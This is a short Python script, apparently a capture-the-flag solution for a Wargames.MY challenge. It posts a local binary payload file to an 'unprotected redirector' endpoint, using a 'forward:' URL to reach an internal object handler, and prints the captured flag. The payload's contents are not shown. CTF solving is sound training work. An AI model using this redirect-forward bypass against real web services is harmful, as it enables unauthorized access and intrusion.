import requests

r = requests.post("http://wgmyws.wargames.my:50002/ws/unprotected/redirector?url=forward:/ws/object", data=open("payload.bin", "rb").read())
# r = requests.post("http://localhost:9191/ws/unprotected/redirector?url=forward:/ws/object", data=open("payload.bin", "rb").read())

print(r.text)

# wgmy{30a4c532348450e39330c663d93b702e}